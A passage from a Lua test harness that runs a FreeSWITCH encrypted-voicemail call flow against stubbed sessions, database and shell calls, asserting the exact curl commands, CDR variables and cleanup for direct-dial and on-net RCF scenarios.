-- Standalone behavioral harness for the encrypted-voicemail FreeSWITCH side:
--   docker/freeswitch/scripts/inbound_router.lua  (STEP-1 voicemail arm,
--                                                  terminate_vvm, on-net chain)
--   docker/freeswitch/scripts/lib/vm_box.lua       (call flow)
--   docker/freeswitch/scripts/lib/vm_deposit.lua   (curl client, retry table)
--   docker/freeswitch/scripts/lib/json.lua         (JSON encode/decode)
-- Contract: docs/ENCRYPTED_VOICEMAIL_INTERFACES.md §5/§6; build plan §6.
--
-- Drives the REAL scripts under a stubbed FreeSWITCH environment (same style
-- as tests/lua/onnet_router_harness.lua). Nothing touches the network or a
-- shell except the harness's own scratch-dir housekeeping:
--   * io.popen is a scripted fake: every command string the code would run is
--     CAPTURED VERBATIM (so tests assert exactly what /bin/sh would receive)
--     and answered from the scenario (HTTP code/body/exit code, or a raise).
--   * os.execute is captured, never run.
--   * fixed container paths are mapped onto a per-scenario scratch dir:
--       /dev/shm/vm/*                    -> <scratch>/vm/*   (REAL files: the
--                                           record stub writes a real WAV, so
--                                           "unlinked on every path" is
--                                           checked on the real filesystem)
--       /run/revup/vm_ingest.header      -> <scratch>/header (or missing)
--       /proc/self/mounts                -> <scratch>/mounts
--       /usr/local/freeswitch/scripts/sounds/vm/*  -> repo sounds (or empty)
--       /usr/local/freeswitch/scripts/lib/*.lua    -> repo lib, loaded INTO the
--                                           sandbox so nested loadfile/io/os
--                                           resolve to the stubs too
--
-- Run:  lua tests/lua/voicemail_harness.lua            (from the repo root)
--       BASELINE_LIBDIR=<dir> lua tests/lua/voicemail_harness.lua
--         [15]: <dir> = a copy of scripts/lib/ with the PRE-change vm_box.lua
--         + vm_deposit.lua; every API-up scenario must produce the same
--         commands, CDR variables, prompts, records, events and logs.

local function script_dir()
    local src = debug.getinfo(1, "S").source
    return (src:match("^@(.*)/[^/]*$")) or "."
end
local REPO = script_dir() .. "/../.."
local ROUTER = REPO .. "/docker/freeswitch/scripts/inbound_router.lua"
local LIBDIR = REPO .. "/docker/freeswitch/scripts/lib/"
local SOUNDS = REPO .. "/docker/freeswitch/scripts/sounds/vm/"

local real_io, real_os = io, os

-- ------------------------------------------------------------------
-- Scratch space
-- ------------------------------------------------------------------
local SCRATCH = real_os.tmpname()
real_os.remove(SCRATCH)
assert(real_os.execute("mkdir -p '" .. SCRATCH .. "'"))
local scenario_no = 0

local function write_file(path, content)
    local f = assert(real_io.open(path, "wb"))
    f:write(content)
    f:close()
end

local function list_dir(dir)
    local p = real_io.popen("ls -A '" .. dir .. "' 2>/dev/null")
    local out = p:read("*a") or ""
    p:close()
    local names = {}
    for n in out:gmatch("[^\n]+") do names[#names + 1] = n end
    return names
end

local function le32(v)
    return string.char(v % 256, math.floor(v / 256) % 256,
        math.floor(v / 65536) % 256, math.floor(v / 16777216) % 256)
end
local function le16(v) return string.char(v % 256, math.floor(v / 256) % 256) end

-- Canonical PCM16 mono WAV of `secs` seconds.
local function wav_bytes(secs, rate)
    rate = rate or 8000
    local n = math.floor(secs * rate + 0.5)
    local data_len = n * 2
    return "RIFF" .. le32(36 + data_len) .. "WAVE" .. "fmt " .. le32(16) .. le16(1)
        .. le16(1) .. le32(rate) .. le32(rate * 2) .. le16(2) .. le16(16)
        .. "data" .. le32(data_len) .. string.rep("\0\0", n)
end

local GOOD_SECRET_LINE = "X-Ingest-Secret: " .. string.rep("s3cr3t", 8) .. "\n"
local MOUNTS_OK = table.concat({
    "overlay / overlay rw,relatime 0 0",
    "shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0",
    "tmpfs /dev/shm/vm tmpfs rw,nosuid,nodev,noexec,relatime,size=524288k,mode=700 0 0",
}, "\n") .. "\n"
local MOUNTS_NO_VM = "overlay / overlay rw,relatime 0 0\nshm /dev/shm tmpfs rw 0 0\n"

local UUID4 = "%x%x%x%x%x%x%x%x%-%x%x%x%x%-4%x%x%x%-[89ab]%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x"

-- Outage resilience fixtures ([14]). The certificate bodies are only checked
-- for PEM structure by lib/vm_spool.lua (openssl is faked here; the real CLI
-- runs in the local docker E2E).
local ONE_CERT = "-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIUQ2VydGlmaWNhdGUtb25lAAAAAAAAAAAw\nCgYIKoZIzj0EAwIwEjEQMA4GA1UEAwwHdGVzdC0xMB4XDTI2\n-----END CERTIFICATE-----\n"
local TWO_CERTS = ONE_CERT .. "-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIUQ2VydGlmaWNhdGUtdHdvAAAAAAAAAAAw\n-----END CERTIFICATE-----\n"
local SPOOL_MOUNT_LINE = "/dev/sda1 /var/lib/crag/vm-spool ext4 rw,relatime 0 0\n"
local USAGE_OK = "12\t/var/lib/crag/vm-spool\nFilesystem     1024-blocks    Used Available Capacity Mounted on\n"
    .. "/dev/sda1         10255636 4102340   5612448      43% /var/lib/crag/vm-spool\n"

-- ------------------------------------------------------------------
-- Scenario runner
-- ------------------------------------------------------------------
-- sc fields (all optional unless noted):
--   inbound_did (req), caller_id, caller_name, sip_from_user, uuid
--   step1 = { product_type = "rcf"|"voicemail"|..., ... }  STEP-1 row
--   oracle = { [e164] = number_routing row }                 on-net rows
--   env = { API_HOST=..., ... } overrides
--   header = string | false (false = missing file)
--   mounts = string
--   sounds = "repo" | "missing"
--   mailbox = { code=, body=, exit= } | function(cmd) | "raise"
--   greeting = { code=, content=, exit= }
--   deposits = { {code=, body=, exit=} | "raise", ... }   (in attempt order)
--   record = { secs=, hangup=true, nofile=true, raise=true }
--   hangup_during_greeting = true
--   raise_on_rec_open = N   (io.open of the message file raises on the Nth open)
--   vm_box_missing = true
--   sweep_last = epoch      (pre-seeded vm_sweep_last global)
-- Outage resilience (D11, [14]):
--   spool = true            /var/lib/crag/vm-spool is a mount (-> <scratch>/spool)
--   recipients = string | false   vm_spool_recipients.pem content (default
--                           ONE_CERT when spool=true; false = missing file)
--   replica = { row = {...} } | { none = true } | { error = "..." }
--             | { noconn = true }   fake db_client.get_connection() answer
--             (absent = db_client without get_connection, i.e. "unusable")
--   openssl = "fail" | "garbage"    fake seal outcome (default: success)
--   usage = "<du/df output>"        answer to vm_spool.usage_cmd()
--   libdir = "<dir>/"               load scripts/lib/* from here ([15] baseline)
local function run_scenario(sc)
    scenario_no = scenario_no + 1
    local dir = SCRATCH .. "/s" .. scenario_no
    assert(real_os.execute("mkdir -p '" .. dir .. "/vm' '" .. dir .. "/nosounds' '"
        .. dir .. "/spool'"))
    local header_path = dir .. "/header"
    if sc.header ~= false then
        write_file(header_path, sc.header or GOOD_SECRET_LINE)
    end
    local recipients_path = dir .. "/recipients.pem"
    local recipients = sc.recipients
    if recipients == nil and sc.spool then recipients = ONE_CERT end
    if recipients then write_file(recipients_path, recipients) end
    local mounts = sc.mounts or MOUNTS_OK
    if sc.spool then mounts = mounts .. SPOOL_MOUNT_LINE end
    write_file(dir .. "/mounts", mounts)

    local cap = {
        setvars = {}, events = {}, popen = {}, execs = {}, hangups = {},
        playbacks = {}, records = {}, bridges = {}, msleeps = {}, logs = {},
        db_calls = {}, answered = false, rec_open_count = 0,
        rec_exists_at_record = nil, greeting_exists_at_record = nil,
    }
    local function ev(s) cap.events[#cap.events + 1] = s end

    local up = true
    local session_vars = {
        uuid               = sc.uuid or "callid-1234@67.231.2.12",
        destination_number = sc.inbound_did,
        caller_id_number   = sc.caller_id or "+15085550123",
        caller_id_name     = sc.caller_name or "",
        sip_from_user      = sc.sip_from_user or sc.caller_id or "+15085550123",
        sip_from_display   = "",
        sip_call_id        = "callid-1234@67.231.2.12",
        sip_received_ip    = "67.231.2.12",
        network_addr       = "67.231.2.12",
    }

    -- path mapping (container path -> scratch/repo path)
    local function map(p)
        if type(p) ~= "string" then return p end
        local rest = p:match("^/dev/shm/vm/(.*)$")
        if rest then return dir .. "/vm/" .. rest end
        if p == "/dev/shm/vm" then return dir .. "/vm" end
        rest = p:match("^/var/lib/crag/vm%-spool/(.*)$")
        if rest then return dir .. "/spool/" .. rest end
        if p == "/var/lib/crag/vm-spool" then return dir .. "/spool" end
        if p == "/run/revup/vm_spool_recipients.pem" then return recipients_path end
        if p == "/run/revup/vm_ingest.header" then return header_path end
        if p == "/proc/self/mounts" then return dir .. "/mounts" end
        rest = p:match("^/usr/local/freeswitch/scripts/sounds/vm/(.*)$")
        if rest then
            if sc.sounds == "missing" then return dir .. "/nosounds/" .. rest end
            return SOUNDS .. rest
        end
        if p:match("^/usr/local/") then return dir .. "/nonexistent" end
        return p
    end

    local function is_msg_path(p)
        return type(p) == "string" and p:match("^/dev/shm/vm/" .. UUID4 .. "%.wav$") ~= nil
    end

    -- ---- io stub ----
    local sandbox_io = setmetatable({}, { __index = real_io })
    sandbox_io.open = function(p, mode)
        if is_msg_path(p) and sc.raise_on_rec_open then
            cap.rec_open_count = cap.rec_open_count + 1
            if cap.rec_open_count == sc.raise_on_rec_open then
                error("injected io.open failure")
            end
        end
        return real_io.open(map(p), mode)
    end

    local function fake_handle(stdout, exit_code)
        local h = {}
        function h:read(_) return stdout end
        function h:close()
            if exit_code == 0 then return true, "exit", 0 end
            return nil, "exit", exit_code
        end
        return h
    end

    local deposit_idx = 0
    sandbox_io.popen = function(cmd, mode)
        cap.popen[#cap.popen + 1] = cmd
        local ready_now = up
        if cmd:find("/v1/voicemail/fs/mailbox/", 1, true) then
            ev("popen:mailbox")
            local m = sc.mailbox
            if m == "raise" then error("injected popen failure") end
            if type(m) == "function" then m = m(cmd) end
            m = m or { code = "200", body = '{"mailbox_id":42,"customer_id":77,"did":"+15550009999","status":"active","accepting":true,"reason":null,"max_message_seconds":300,"greeting":null}' }
            return fake_handle((m.body or "") .. "\n" .. m.code, m.exit or 0)
        elseif cmd:find("/v1/voicemail/fs/greetings/", 1, true) then
            ev("popen:greeting")
            local g = sc.greeting or { code = "404" }
            local out = cmd:match(" %-o '([^']+)'")
            if g.code == "200" and out then
                write_file(map(out), g.content or wav_bytes(2))
            end
            return fake_handle(g.code, g.exit or 0)
        elseif cmd:find("/v1/voicemail/fs/deposit", 1, true) then
            deposit_idx = deposit_idx + 1
            ev("popen:deposit:" .. (ready_now and "up" or "down"))
            local d = (sc.deposits or {})[deposit_idx]
                or { code = "200", body = '{"status":"stored","message_id":9001}' }
            if d == "raise" then error("injected popen failure") end
            -- the real curl reads the file: it must exist at this moment
            local src = cmd:match("%-%-data%-binary '@([^']+)'")
            local f = src and real_io.open(map(src), "rb")
            cap.deposit_file_present = cap.deposit_file_present or {}
            cap.deposit_file_present[#cap.deposit_file_present + 1] = (f ~= nil)
            if f then
                cap.deposit_bytes = f:read("*a")
                f:close()
            end
            return fake_handle((d.body or "") .. "\n" .. d.code, d.exit or 0)
        elseif cmd:find("openssl cms -encrypt", 1, true) then
            -- Fake openssl: the frame must exist in tmpfs at this moment; a
            -- fake DER AuthEnvelopedData lands at -out, `install` copies the
            -- tmpfs META to the spool .json.tmp. Real openssl runs in the
            -- local docker E2E (docs/VOICEMAIL_OUTAGE_RESILIENCE.md §9).
            ev("popen:seal")
            cap.seal_cmds = (cap.seal_cmds or 0) + 1
            local inp = cmd:match(" %-in '([^']+)'")
            local outp = cmd:match(" %-out '([^']+)'")
            local isrc, idst = cmd:match("install %-m 0600 '([^']+)' '([^']+)'")
            local f = inp and real_io.open(map(inp), "rb")
            if f then
                cap.sealed_frame = f:read("*a")
                f:close()
            end
            cap.recips_at_seal = 0
            for _, n in ipairs(list_dir(dir .. "/vm")) do
                if n:match("^r%d_.*%.pem$") then cap.recips_at_seal = cap.recips_at_seal + 1 end
            end
            if sc.openssl == "fail" then
                return fake_handle("Error: unable to load certificate\n", 1)
            end
            if outp then
                local body = (sc.openssl == "garbage") and "not a cms blob at all, sorry"
                    or ("\48\130\1\0\6\11\42\134\72\134\247\13\1\9\16\1\23" .. string.rep("\170", 200))
                write_file(map(outp), body)
            end
            if isrc and idst then
                local s = real_io.open(map(isrc), "rb")
                if s then
                    write_file(map(idst), s:read("*a"))
                    s:close()
                end
            end
            return fake_handle("SEALED_OK\n", 0)
        elseif cmd:find("du -sk ", 1, true) then
            ev("popen:usage")
            cap.usage_cmd = cmd
            return fake_handle(sc.usage or USAGE_OK, 0)
        end
        ev("popen:other")
        return fake_handle("", 0)
    end

    -- ---- os stub ----
    local sc_env = sc.env or {}
    local PINNED = {
        SBC_PROXY_IP = "10.0.0.1", SBC_PROXY_IP_FAILOVER = "10.0.0.2",
        EXTERNAL_SIP_IP = "203.0.113.50", FS_ZONE = "east",
        API_HOST = "10.142.0.103", API_PORT = "8000",
    }
    local UNSET = { API_CALLING_ENABLED = true, TEST_MODE = true,
        RCF_FROM_PASSTHROUGH = true, BRIDGE_PROGRESS_TIMEOUT = true, FS_NODE_ID = true }
    local sandbox_os = setmetatable({
        getenv = function(k)
            if sc_env[k] ~= nil then
                if sc_env[k] == false then return nil end
                return sc_env[k]
            end
            if PINNED[k] ~= nil then return PINNED[k] end
            if UNSET[k] then return nil end
            return real_os.getenv(k)
        end,
        remove = function(p)
            ev("remove:" .. tostring(p))
            return real_os.remove(map(p))
        end,
        rename = function(a, b)
            ev("rename:" .. tostring(a) .. ">" .. tostring(b))
            return real_os.rename(map(a), map(b))
        end,
        execute = function(cmd)
            cap.execs[#cap.execs + 1] = cmd
            ev("os.execute")
            return true, "exit", 0
        end,
    }, { __index = real_os })

    -- ---- session stub ----
    local session = {}
    function session:getVariable(k) return session_vars[k] end
    function session:setVariable(k, v)
        if v == "" then v = nil end
        session_vars[k] = v
        cap.setvars[k] = v
        ev("setvar:" .. tostring(k) .. "=" .. tostring(v))
    end
    function session:ready() return up end
    function session:answer() cap.answered = true; ev("answer") end
    function session:sleep(ms) ev("sleep:" .. tostring(ms)) end
    function session:hangup(cause)
        cap.hangups[#cap.hangups + 1] = cause or "NORMAL_CLEARING"
        ev("hangup:" .. tostring(cause) .. ":" .. (up and "up" or "down"))
        up = false
    end
    function session:execute(app, data)
        if app == "bridge" then
            cap.bridges[#cap.bridges + 1] = data
            session_vars.originate_disposition = "SUCCESS"
        elseif app == "playback" then
            if not up then return end
            cap.playbacks[#cap.playbacks + 1] = data
            ev("playback:" .. data)
            if sc.hangup_during_greeting and (data:match("default_greeting") or data:match("/g_")) then
                up = false
            end
        elseif app == "record" then
            if not up then return end
            cap.records[#cap.records + 1] = data
            ev("record:" .. data)
            local path = data:match("^(%S+)")
            -- greeting file must already be gone, nothing else in the dir
            local names = list_dir(dir .. "/vm")
            cap.vm_dir_at_record = names
            local r = sc.record or { secs = 12 }
            if not r.nofile then
                write_file(map(path), wav_bytes(r.secs or 12))
            end
            session_vars.record_ms = tostring(math.floor((r.secs or 12) * 1000))
            if r.raise then error("injected record failure") end
            if r.hangup then up = false end
        else
            ev("execute:" .. app)
        end
    end

    -- ---- freeswitch stub ----
    local globals = {}
    for _, ip in ipairs({ "10.0.0.1", "10.0.0.2" }) do
        globals["sbc_health_" .. ip] = string.format("up:%d", real_os.time())
    end
    if sc.sweep_last then globals["vm_sweep_last"] = tostring(sc.sweep_last) end
    local freeswitch = {
        consoleLog = function(level, msg) cap.logs[#cap.logs + 1] = { level = level, msg = msg } end,
        getGlobalVariable = function(k) return globals[k] end,
        setGlobalVariable = function(k, v) globals[k] = v end,
        msleep = function(ms) cap.msleeps[#cap.msleeps + 1] = ms; ev("msleep:" .. ms) end,
    }

    -- ---- fake db ----
    local s1 = sc.step1 or {}
    local function call(name, did) cap.db_calls[#cap.db_calls + 1] = name .. ":" .. tostring(did) end
    local fake_db = {
        lookup_rcf = function(did)
            call("rcf", did)
            if s1.product_type == "rcf" and did == sc.inbound_did then
                return {
                    customer_id = tostring(s1.customer_id), forward_to = s1.forward_to,
                    pass_caller_id = (s1.pass_caller_id == false) and "f" or "t",
                    ring_timeout = "30", max_channels = "0", name = s1.rcf_name,
                    traffic_grade = "standard", cpm_limit = "60", daily_limit = "500", status = "active",
                }
            end
        end,
        lookup_api_did = function(did) call("api", did) end,
        lookup_trunk_did = function(did) call("trunk", did) end,
        lookup_voicemail_did = function(did)
            call("voicemail", did)
            if s1.product_type == "voicemail" and did == sc.inbound_did then
                return {
                    did = sc.inbound_did, product_type = "voicemail",
                    customer_id = tostring(s1.customer_id),
                    product_ref_id = tostring(s1.mailbox_id),
                    product_enabled = (s1.enabled == false) and "f" or "t",
                    customer_status = s1.customer_status or "active",
                    product_name = s1.label or "Voicemail",
                    traffic_grade = s1.traffic_grade or "premium",
                }
            end
        end,
        resolve_destination = function(did) call("resolve", did); return (sc.oracle or {})[did] end,
        get_trunk_endpoint_ips = function() return nil end,
    }
    -- Zone replica (lib/vm_replica.lua -> db_client.get_connection()).
    if sc.replica then
        local rp = sc.replica
        fake_db.get_connection = function()
            ev("replica:connect")
            if rp.noconn then return nil end
            return {
                execute = function(_, sql)
                    cap.replica_sql = sql
                    ev("replica:query")
                    if rp.error then return nil, rp.error end
                    local served = false
                    return {
                        fetch = function()
                            if rp.none or served then return nil end
                            served = true
                            local r = {}
                            for k, v in pairs(rp.row) do r[k] = v end
                            return r
                        end,
                        close = function() end,
                    }
                end,
            }
        end
        fake_db.close = function() cap.replica_closed = true; ev("replica:close") end
    end

    -- ---- sandbox ----
    local env
    env = setmetatable({
        session = session, freeswitch = freeswitch, os = sandbox_os, io = sandbox_io,
    }, { __index = _G })
    env.loadfile = function(path)
        if type(path) ~= "string" then return nil, "bad path" end
        if path:match("db_client") then
            return function() return fake_db end
        end
        local name = path:match("^/usr/local/freeswitch/scripts/lib/([%w_]+)%.lua$")
        if name then
            if name == "vm_box" and sc.vm_box_missing then
                return nil, "cannot open " .. path
            end
            return loadfile((sc.libdir or LIBDIR) .. name .. ".lua", "t", env)
        end
        return nil, "cannot open " .. path
    end
    env.package = setmetatable({
        path = package.path, cpath = package.cpath,
        loadlib = function() return nil, "stubbed" end, loaded = {},
    }, { __index = package })

    local chunk, err = loadfile(ROUTER, "t", env)
    if not chunk then error("loadfile router: " .. tostring(err)) end
    local ok, run_err = pcall(chunk)
    cap.script_ok = ok
    cap.script_err = run_err
    cap.vm_dir_after = list_dir(dir .. "/vm")
    cap.spool_after = list_dir(dir .. "/spool")
    cap.session_vars = session_vars
    cap.dir = dir
    return cap
end

-- ------------------------------------------------------------------
-- Assertions
-- ------------------------------------------------------------------
local failures, passes = 0, 0
local function check(name, cond, detail)
    if cond then
        passes = passes + 1
        print("  PASS  " .. name)
    else
        failures = failures + 1
        print("  FAIL  " .. name .. " -- " .. tostring(detail))
    end
end

local function count(t, pred)
    local n = 0
    for _, v in ipairs(t) do if pred(v) then n = n + 1 end end
    return n
end

local function find_event(cap, prefix)
    for i, e in ipairs(cap.events) do
        if e:sub(1, #prefix) == prefix then return i end
    end
    return nil
end

local function popen_kind(cap, frag)
    local out = {}
    for _, c in ipairs(cap.popen) do
        if c:find(frag, 1, true) then out[#out + 1] = c end
    end
    return out
end

local function has_log(cap, level, frag)
    for _, l in ipairs(cap.logs) do
        if (level == nil or l.level == level) and l.msg:find(frag, 1, true) then return true end
    end
    return false
end

-- Modules (in a plain env) for unit checks and expected-value construction.
local function plain_load(name)
    local env = setmetatable({ freeswitch = { consoleLog = function() end } }, { __index = _G })
    env.loadfile = function(p)
        local n = p:match("/lib/([%w_]+)%.lua$")
        return loadfile(LIBDIR .. n .. ".lua", "t", env)
    end
    return assert(loadfile(LIBDIR .. name .. ".lua", "t", env))()
end
local json = plain_load("json")
local dep = plain_load("vm_deposit")

local function meta_of(cmd)
    local b64 = cmd:match("'X%-VM%-Meta: ([^']*)'")
    return b64, b64 and json.decode(dep.b64url_decode(b64) or "")
end

local API = "http://10.142.0.103:8000"
local HDR = "-H @/run/revup/vm_ingest.header"
local function expected_mailbox_cmd(id)
    return "curl -q -s --noproxy '*' --connect-timeout 1 --max-time 3 " .. HDR
        .. " -H 'Accept: application/json' -w '\\n%{http_code}' '" .. API
        .. "/v1/voicemail/fs/mailbox/" .. id .. "' 2>/dev/null"
end
local function expected_deposit_cmd(path, b64)
    return "curl -q -s --noproxy '*' --connect-timeout 3 --max-time 15 " .. HDR
        .. " -H 'Content-Type: audio/wav' -H 'Expect:' -H 'X-VM-Meta: " .. b64
        .. "' --data-binary '@" .. path .. "' -w '\\n%{http_code}' '" .. API
        .. "/v1/voicemail/fs/deposit' 2>/dev/null"
end
local function expected_greeting_cmd(id, path)
    return "curl -q -s --noproxy '*' --connect-timeout 2 --max-time 5 --max-filesize 6291456 "
        .. HDR .. " -o '" .. path .. "' -w '%{http_code}' '" .. API
        .. "/v1/voicemail/fs/greetings/" .. id .. "/audio' 2>/dev/null"
end
local SWEEP_CMD = "find /dev/shm/vm -mindepth 1 -maxdepth 1 -type f -mmin +15 -delete >/dev/null 2>&1"

-- Common fixtures
local MAILBOX_DID = "+15550009999"
local function direct(extra)
    local sc = {
        inbound_did = MAILBOX_DID,
        step1 = { product_type = "voicemail", customer_id = 77, mailbox_id = 42 },
    }
    for k, v in pairs(extra or {}) do sc[k] = v end
    return sc
end
local VM_ORACLE_ROW = {
    did = MAILBOX_DID, product_type = "voicemail", customer_id = "77",
    product_ref_id = "42", product_enabled = "t", customer_status = "active",
    forward_to = nil, pass_caller_id = nil, ring_timeout = nil, max_channels = nil,
    product_name = "Front desk VM", voice_url = nil, fallback_url = nil, trunk_id = nil,
}
local function copy(t) local c = {} for k, v in pairs(t) do c[k] = v end return c end

local function rec_path_of(cap)
    local r = cap.records[1]
    return r and r:match("^(%S+)")
end

local function assert_clean(tag, cap)
    check(tag .. ": /dev/shm/vm empty after the call", #cap.vm_dir_after == 0,
        table.concat(cap.vm_dir_after, ","))
    check(tag .. ": script did not raise", cap.script_ok, cap.script_err)
end

-- Owner decision O6: the recording leg gets rtp_timer_name=soft and
-- jitterbuffer_msec=60:200, both set BEFORE the answer (FS reads them only
-- when the answer creates the RTP session). If `recorded`, the record must
-- come after the answer.
local function assert_jitterbuffer(tag, cap, recorded)
    local ti = find_event(cap, "setvar:rtp_timer_name=")
    local ji = find_event(cap, "setvar:jitterbuffer_msec=")
    local ai = find_event(cap, "answer")
    local ri = find_event(cap, "record:")
    check(tag .. ": rtp_timer_name=soft, jitterbuffer_msec=60:200",
        cap.setvars.rtp_timer_name == "soft" and cap.setvars.jitterbuffer_msec == "60:200",
        tostring(cap.setvars.rtp_timer_name) .. " / " .. tostring(cap.setvars.jitterbuffer_msec))
    check(tag .. ": timer + jitter buffer set BEFORE answer",
        ti and ji and ai and ti < ai and ji < ai,
        tostring(ti) .. "," .. tostring(ji) .. " vs answer " .. tostring(ai))
    check(tag .. ": each set exactly once",
        count(cap.events, function(e) return e:match("^setvar:rtp_timer_name=") ~= nil end) == 1
        and count(cap.events, function(e) return e:match("^setvar:jitterbuffer_msec=") ~= nil end) == 1,
        "set more than once")
    if recorded then
        check(tag .. ": answer -> record order", ai and ri and ai < ri, tostring(ai) .. " vs " .. tostring(ri))
    end
end

print("== voicemail_harness ==")

-- ==================================================================
-- [1] Direct dial -> terminate_vvm -> record -> deposit (happy path)
-- ==================================================================
do
    print("[1] direct dial to a mailbox DID: answer, default greeting, record, deposit 200")
    local c = run_scenario(direct({
        caller_id = "+15085550123", sip_from_user = "+15085550123", caller_name = "Jane Caller",
        mailbox = { code = "200", body = '{"mailbox_id":42,"customer_id":77,"did":"+15550009999","status":"active","accepting":true,"reason":null,"max_message_seconds":120,"greeting":null}' },
    }))
    local v = c.setvars
    check("product_type=voicemail", v.product_type == "voicemail", v.product_type)
    check("customer_id = mailbox owner (77)", v.customer_id == "77", v.customer_id)
    check("terminating_customer_id = 77", v.terminating_customer_id == "77", v.terminating_customer_id)
    check("origin_customer_id = 77 (direct)", v.origin_customer_id == "77", v.origin_customer_id)
    check("on_net=false, hops=0", v.on_net == "false" and v.on_net_hops == "0", tostring(v.on_net) .. "/" .. tostring(v.on_net_hops))
    check("traffic_grade from the customer row", v.traffic_grade == "premium", v.traffic_grade)
    check("lua_routed=true", v.lua_routed == "true", v.lua_routed)
    check("no bridge / no carrier dial string", #c.bridges == 0, #c.bridges)
    check("STEP-1 order rcf -> api -> trunk -> voicemail",
        c.db_calls[1] == "rcf:" .. MAILBOX_DID and c.db_calls[2] == "api:" .. MAILBOX_DID
        and c.db_calls[3] == "trunk:" .. MAILBOX_DID and c.db_calls[4] == "voicemail:" .. MAILBOX_DID,
        table.concat(c.db_calls, ","))
    check("answered", c.answered, c.answered)
    check("default greeting prompt file played",
        c.playbacks[1] == "/usr/local/freeswitch/scripts/sounds/vm/default_greeting.wav", c.playbacks[1])
    check("beep tone after greeting", c.playbacks[2] == "tone_stream://%(500,0,1000)", c.playbacks[2])
    check("'#' terminator + 8 kHz record rate",
        c.setvars.playback_terminators == "#" and c.setvars.record_sample_rate == "8000",
        tostring(c.setvars.playback_terminators) .. "/" .. tostring(c.setvars.record_sample_rate))
    local rp = rec_path_of(c)
    check("record path = /dev/shm/vm/<uuid4>.wav", rp and rp:match("^/dev/shm/vm/" .. UUID4 .. "%.wav$"), rp)
    check("record args: max_message_seconds from API, silence 200/10",
        c.records[1] == rp .. " 120 200 10", c.records[1])
    check("record args end in '200 10'", c.records[1] and c.records[1]:match(" 200 10$") ~= nil, c.records[1])
    assert_jitterbuffer("[1]", c, true)
    local msg_uuid = rp and rp:match("^/dev/shm/vm/(.*)%.wav$")
    check("vm_msg_uuid CDR var = record file uuid", c.setvars.vm_msg_uuid == msg_uuid, c.setvars.vm_msg_uuid)
    check("exactly 2 commands (mailbox GET, deposit POST)", #c.popen == 2, #c.popen)
    check("mailbox GET command is exact", c.popen[1] == expected_mailbox_cmd(42), c.popen[1])
    local b64, meta = meta_of(c.popen[2] or "")
    check("X-VM-Meta is base64url (no padding)", b64 and b64:match("^[A-Za-z0-9_-]+$"), b64)
    check("deposit POST command is exact", c.popen[2] == expected_deposit_cmd(rp, b64 or "?"), c.popen[2])
    check("meta v=1", meta and meta.v == 1, meta and meta.v)
    check("meta msg_uuid = record uuid", meta and meta.msg_uuid == msg_uuid, meta and meta.msg_uuid)
    check("meta mailbox_id=42 (number)", meta and meta.mailbox_id == 42, meta and meta.mailbox_id)
    check("meta did", meta and meta.did == MAILBOX_DID, meta and meta.did)
    check("meta caller number/name", meta and meta.caller_id_number == "+15085550123"
        and meta.caller_id_name == "Jane Caller", meta and (tostring(meta.caller_id_number) .. "/" .. tostring(meta.caller_id_name)))
    check("meta duration_ms = 12000 (from the WAV)", meta and meta.duration_ms == 12000, meta and meta.duration_ms)
    check("meta call_uuid = FS uuid", meta and meta.call_uuid == "callid-1234@67.231.2.12", meta and meta.call_uuid)
    check("meta fs_node/zone", meta and meta.fs_node == "east-fs" and meta.zone == "east",
        meta and (tostring(meta.fs_node) .. "/" .. tostring(meta.zone)))
    check("deposit body = the recorded WAV bytes", c.deposit_bytes == wav_bytes(12), c.deposit_bytes and #c.deposit_bytes)
    local hi, di = find_event(c, "hangup:NORMAL_CLEARING:up"), find_event(c, "popen:deposit")
    check("caller hung up by FS BEFORE the deposit", hi and di and hi < di, tostring(hi) .. " vs " .. tostring(di))
    check("deposit ran on a hung-up channel", c.events[di or 1] == "popen:deposit:down", c.events[di or 1])
    check("vm_result=stored, vm_message_id=9001", c.setvars.vm_result == "stored" and c.setvars.vm_message_id == "9001",
        tostring(c.setvars.vm_result) .. "/" .. tostring(c.setvars.vm_message_id))
    check("vm_deposit_http=200 attempts=1", c.setvars.vm_deposit_http == "200" and c.setvars.vm_deposit_attempts == "1",
        tostring(c.setvars.vm_deposit_http) .. "/" .. tostring(c.setvars.vm_deposit_attempts))
    check("no msleep on success", #c.msleeps == 0, #c.msleeps)
    check("opportunistic sweep runs the exact constant command", c.execs[1] == SWEEP_CMD, c.execs[1])
    assert_clean("[1]", c)
end

-- ==================================================================
-- [2] On-net: RCF forward_to = mailbox DID (no carrier leg)
-- ==================================================================
do
    print("[2] on-net RCF -> mailbox DID: chain resolver, no carrier leg, owner billed")
    local c = run_scenario({
        inbound_did = "+16170000001", caller_id = "+15085550777", sip_from_user = "+15085550777",
        caller_name = "Bob",
        step1 = { product_type = "rcf", customer_id = 10, forward_to = MAILBOX_DID, pass_caller_id = true, rcf_name = "Origin" },
        oracle = { [MAILBOX_DID] = VM_ORACLE_ROW },
    })
    local v = c.setvars
    check("no bridge at all (no carrier B-leg)", #c.bridges == 0, #c.bridges)
    check("no cdr_* B-leg vars on the A-leg", v.cdr_leg == nil and v.cdr_carrier_leg == nil, tostring(v.cdr_leg))
    check("product_type=voicemail", v.product_type == "voicemail", v.product_type)
    check("customer_id = mailbox owner 77 (terminal)", v.customer_id == "77", v.customer_id)
    check("origin_customer_id = RCF customer 10", v.origin_customer_id == "10", v.origin_customer_id)
    check("on_net=true hops=1", v.on_net == "true" and v.on_net_hops == "1", tostring(v.on_net) .. "/" .. tostring(v.on_net_hops))
    check("voicemail STEP-1 lookup NOT run for an RCF DID",
        count(c.db_calls, function(x) return x:match("^voicemail:") end) == 0, table.concat(c.db_calls, ","))
    check("resolved via number_routing", count(c.db_calls, function(x) return x == "resolve:" .. MAILBOX_DID end) == 1,
        table.concat(c.db_calls, ","))
    check("recorded + deposited", #c.records == 1 and #popen_kind(c, "/fs/deposit") == 1, #c.records)
    local _, meta = meta_of(popen_kind(c, "/fs/deposit")[1] or "")
    check("meta did = mailbox DID, caller = original caller",
        meta and meta.did == MAILBOX_DID and meta.caller_id_number == "+15085550777" and meta.caller_id_name == "Bob",
        meta and (tostring(meta.did) .. " " .. tostring(meta.caller_id_number) .. " " .. tostring(meta.caller_id_name)))
    check("vm_result=stored", v.vm_result == "stored", v.vm_result)
